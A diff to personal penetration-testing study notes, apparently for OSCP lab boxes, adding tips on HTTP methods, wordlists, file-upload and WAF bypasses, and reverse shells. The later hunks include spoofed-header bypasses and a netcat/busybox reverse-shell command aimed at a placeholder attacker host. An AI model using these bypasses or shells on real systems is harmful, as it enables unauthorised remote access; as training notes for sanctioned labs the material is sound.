@@ -6,7 +6,8 @@ usually the likely attack vector (But can be a rabbit hole as well so dont fall 
 
 - check the source code, robots.txt. can also run inspect to see whats going on in the background
 
-- If GET doesn't work, why not POST! (see Nickel box on PG)
+- If GET doesn't work, why not POST! (see Nickel box on PG) 
+	- PUT can also work on occasion, especially if you are able to overwrite files like SSH keys or forcefully change a user's password
 
 - if need be, fire up burp suite or Inspect the page
 
@@ -92,6 +93,7 @@ see if you can upload files via the media or the plugins tab.
 - The choice of wordlist can be important. What I find useful are: (can be found in /usr/share/wordlists/seclists/Discovery/Web-Content/)
 	- Seclists's big.txt, medium directory (with this you should put in the extension flags as well or you may miss things!)
 	- Seclists raft medium directory, files
+	- NEVER EVER LIMIT YOUR WORDLIST TO LOWERCASE ONLY, you might miss certain important files that only exist in uppercase
 ```bash
 
 nikto -h <ip> -C all
@@ -193,6 +195,8 @@ once you find some way to upload stuff, see if you can upload php or aspx files 
 - try appending the magic bytes to the malicious script to trick the system. To do this use burpsuite to intercept the upload and then add the magic bytes in the body.
 
 - change the file format header to application/pdf to see if it fools the system
+  
+- if you have access to the file management system, usually deleting the .htaccess file will solve all your problems
 
 - If there is a WAF in effect, you can intercept the request and add the following headers to the POST request:
 
@@ -217,14 +221,18 @@ X-Remote-Addr: 127.0.0.1
 
  if your shell is part of a multi staged exploit i.e where the exploit script downloads the shell file from you and then executes it on the target, see if the exploit script has a sleep function. lengthen the sleep function to like 10 seconds or something because it takes a while to fully download your shell script
 
-- some boxes have firewalls rules so you may need to change your revshell lport to something common like port 80 or 443 to be safe. you can also consider using existing open ports on the target (egress traffic might be open)
+If you have doubts about whether the target is able to reach your HTTP server, you can always check if you received a GET request on your HTTP server tab/terminal. Using Wireshark is also another way to monitor if the target is able to communicate with your machine.
+
+*From experience, whenever possible, always use a stageless payload for OSCP as it usually works if you have the ability to execute a file
+
+- some boxes have firewalls rules so you may need to change your revshell lport to something common like port 53, 80 or 443 to be safe. you can also consider using existing open ports on the target (egress traffic might be open)
 
 - For Wordpress, uploaded stuff are usually in wp-content
 
 - sometimes a direct php revshell would not work. Try a php backdoor shell first and then use it to execute a netcat reverse shell
 
 - is your nc rev shell not working? perhaps the nc on the system is an older version and does not support the -e flag. 
-    - To test this, try just running nc <attacker ip> <port>. If you get a connection back, then do the following and you should get a nc revshell
+    - To test this, try just running `nc <attacker ip> <port>`. If you get a connection back, then do the following and you should get a nc revshell
 
 ```bash
 busybox nc <attacker ip> <port> -e /bin/bash 
